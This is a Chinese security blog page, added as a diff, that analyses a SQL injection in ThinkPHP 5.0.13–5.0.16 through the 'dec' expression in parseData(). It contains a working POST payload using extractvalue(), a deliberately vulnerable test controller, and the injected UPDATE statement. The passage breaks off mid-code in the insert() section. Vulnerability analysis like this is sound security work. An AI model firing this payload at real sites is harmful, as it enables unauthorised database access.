@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        ThinkPHP5 最新一处注入分析 - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar ">
+            <img src="/img/avatar.jpeg" />
+        </div>
+        <div class="name">
+            <i>seaii</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/collect/">
+                    <i class="iconfont icon-shoucang1"></i>
+                    <span>COLLECT</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">0x02 准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%88%86%E6%9E%90"><span class="toc-text">0x03 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-input"><span class="toc-text">3.1 input()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-update"><span class="toc-text">3.2 update()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-1-parseData"><span class="toc-text">3.2.1 parseData()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-2-2-parseKey"><span class="toc-text">3.2.2 parseKey()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-3-insert"><span class="toc-text">3.3 insert()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E9%98%B2%E5%BE%A1"><span class="toc-text">0x04 防御</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        ThinkPHP5 最新一处注入分析
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2018-04-08 20:29:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#thinkphp" title="thinkphp">thinkphp</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content ">
+        <h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>听说thinkphp又出事了，之前看过一次tp5的源码，不过只看了查询（select）的过程，这次问题出在update和insert中，但是归根结底还是<code>fileExp()</code>这个函数出了问题，分析过程有部分重复，建议配合前文食用:)</p>
+<span id="more"></span>
+
+
+<h3 id="0x02-准备工作"><a href="#0x02-准备工作" class="headerlink" title="0x02 准备工作"></a>0x02 准备工作</h3><p>根据payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[0]=dec&amp;name[1]=1 and (extractvalue(1,concat(1,(user()))))#&amp;name[2]=1</span><br></pre></td></tr></table></figure>
+
+<p><code>dec</code>是thinkphp实现的一个sql的表达式，和之前的<code>not like</code>性质类似。</p>
+<p><code>dec</code>这个表达式是在<code>5.0.13</code>新实现的，该漏洞在<code>5.0.16</code>被修复，所以影响范围也在这之间。</p>
+<p>测试代码：</p>
+<p>application\index\controller\Index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;post.name/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;id&#x27;</span>=&gt; <span class="number">1</span>])-&gt;<span class="title function_ invoke__">update</span>([<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h3><h4 id="3-1-input"><a href="#3-1-input" class="headerlink" title="3.1 input()"></a>3.1 input()</h4><p>这个函数可以看之前的文章<a href="http://seaii-blog.com/index.php/2017/10/02/71.html">Thinkphp5实现安全数据库操作以及部分运行流程分析</a>的3.1部分，流程是相同的。</p>
+<h4 id="3-2-update"><a href="#3-2-update" class="headerlink" title="3.2 update()"></a>3.2 update()</h4><p>直接定位到这个漏洞关键点，<code>thinkphp/library/think/db/Builder.php</code>的update函数。</p>
+<p>具体定位过程可以看之前文章的3.2部分。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成update SQL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array     $data 数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array     $options 表达式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>);</span><br><span class="line">        <span class="variable">$data</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseData</span>(<span class="variable">$data</span>, <span class="variable">$options</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$set</span>[] = <span class="variable">$key</span> . <span class="string">&#x27;=&#x27;</span> . <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">str_replace</span>(</span><br><span class="line">            [<span class="string">&#x27;%TABLE%&#x27;</span>, <span class="string">&#x27;%SET%&#x27;</span>, <span class="string">&#x27;%JOIN%&#x27;</span>, <span class="string">&#x27;%WHERE%&#x27;</span>, <span class="string">&#x27;%ORDER%&#x27;</span>, <span class="string">&#x27;%LIMIT%&#x27;</span>, <span class="string">&#x27;%LOCK%&#x27;</span>, <span class="string">&#x27;%COMMENT%&#x27;</span>],</span><br><span class="line">            [</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$set</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseJoin</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseWhere</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseOrder</span>(<span class="variable">$options</span>[<span class="string">&#x27;order&#x27;</span>], <span class="variable">$options</span>),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseLimit</span>(<span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>]),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseLock</span>(<span class="variable">$options</span>[<span class="string">&#x27;lock&#x27;</span>]),</span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">parseComment</span>(<span class="variable">$options</span>[<span class="string">&#x27;comment&#x27;</span>]),</span><br><span class="line">            ], <span class="variable">$this</span>-&gt;updateSql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sql</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>问题出在更新数据处，跟进<code>parseData</code>函数。</p>
+<h5 id="3-2-1-parseData"><a href="#3-2-1-parseData" class="headerlink" title="3.2.1 parseData()"></a>3.2.1 parseData()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据分析</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array     $data 数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array     $options 查询参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseData</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$options</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取绑定信息</span></span><br><span class="line">        <span class="variable">$bind</span> = <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getFieldsBind</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;*&#x27;</span> == <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]) &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="title function_ invoke__">array_keys</span>(<span class="variable">$bind</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$fields</span> = <span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$item</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$key</span>, <span class="variable">$options</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">method_exists</span>(<span class="variable">$val</span>, <span class="string">&#x27;__toString&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// 对象数据写入</span></span><br><span class="line">                <span class="variable">$val</span> = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$key</span>, <span class="variable">$fields</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$options</span>[<span class="string">&#x27;strict&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;fields not exists:[&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">            <span class="comment">/*******这里是重点************/</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$val</span>[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;exp&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;inc&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;+&#x27;</span> . <span class="variable">$val</span>[<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;dec&#x27;</span>:</span><br><span class="line">                        <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$val</span>[<span class="number">1</span>]) . <span class="string">&#x27;-&#x27;</span> . <span class="variable">$val</span>[<span class="number">2</span>];</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_scalar</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="comment">// 过滤非标量数据</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="number">0</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;:&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">isBind</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$val</span>, <span class="number">1</span>))) &#123;</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="variable">$val</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$key</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">bind</span>(<span class="string">&#x27;data__&#x27;</span> . <span class="variable">$key</span>, <span class="variable">$val</span>, <span class="keyword">isset</span>(<span class="variable">$bind</span>[<span class="variable">$key</span>]) ? <span class="variable">$bind</span>[<span class="variable">$key</span>] : PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">                    <span class="variable">$result</span>[<span class="variable">$item</span>] = <span class="string">&#x27;:data__&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到当<code>$val</code>是数组时，会将其第一个元素取出来作为表达式。这里有exp、des、inc三个表达式，但是exp已经被过滤了（filterExp里的第一个。。。）。第二个元素进入了<code>parseKey</code>函数，第三个元素没有任何操作直接拼接。跟进<code>parseKey()</code>看一下：</p>
+<h5 id="3-2-2-parseKey"><a href="#3-2-2-parseKey" class="headerlink" title="3.2.2 parseKey()"></a>3.2.2 parseKey()</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字段名分析</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array  $options</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>emmmm，不要慌。thinkphp&#x2F;library&#x2F;think&#x2F;db&#x2F;Builder.php只是一个抽象类，具体实现在这里</p>
+<p><code>thinkphp/library/think/db/builder/Mysql.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字段和表名处理</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array  $options</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;$.&#x27;</span>) &amp;&amp; <span class="literal">false</span> === <span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;(&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// JSON字段支持</span></span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$field</span>, <span class="variable">$name</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;$.&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line">            <span class="variable">$key</span>                = <span class="string">&#x27;json_extract(&#x27;</span> . <span class="variable">$field</span> . <span class="string">&#x27;, \&#x27;$.&#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27;\&#x27;)&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$key</span>, <span class="string">&#x27;.&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[,\&#x27;\&quot;\(\)`\s]/&#x27;</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$table</span>, <span class="variable">$key</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$key</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;__TABLE__&#x27;</span> == <span class="variable">$table</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getTable</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>][<span class="variable">$table</span>])) &#123;</span><br><span class="line">                <span class="variable">$table</span> = <span class="variable">$options</span>[<span class="string">&#x27;alias&#x27;</span>][<span class="variable">$table</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[,\&#x27;\&quot;\*\(\)`.\s]/&#x27;</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="variable">$key</span> = <span class="string">&#x27;`&#x27;</span> . <span class="variable">$key</span> . <span class="string">&#x27;`&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$table</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$table</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;`.`&#x27;</span>, <span class="variable">$table</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$key</span> = <span class="string">&#x27;`&#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27;`.&#x27;</span> . <span class="variable">$key</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>并没有什么过滤，不过在某些情况下会用反引号把字段的值包起来，可能会影响payload的构造。</p>
+<p>经过这么一系列操作构造出来的sql语句像下面这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> `<span class="keyword">user</span>` <span class="keyword">set</span> username<span class="operator">=</span><span class="number">1</span> #name[<span class="number">1</span>] 可控</span><br><span class="line">						 <span class="operator">-</span> #name[<span class="number">0</span>] <span class="type">dec</span> <span class="operator">=</span><span class="operator">&gt;</span> <span class="operator">-</span></span><br><span class="line">						 <span class="number">1</span> #name[<span class="number">2</span>] 可控</span><br></pre></td></tr></table></figure>
+
+<p>有两处可控，约等于为所欲为。</p>
+<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///180408/Lfe10Lj13A.png" alt="mark"></p>
+<h4 id="3-3-insert"><a href="#3-3-insert" class="headerlink" title="3.3 insert()"></a>3.3 insert()</h4><p><code>thinkphp/library/think/db/Builder.php</code>构造insert语句的时候同样使用了<code>parseData()</code>函数，也存在问题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成insert SQL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array     $data 数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array     $options 表达式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> bool      $replace 是否replace</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span>, <span class="variable">$options</span> = [], <span class="variable">$replace</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 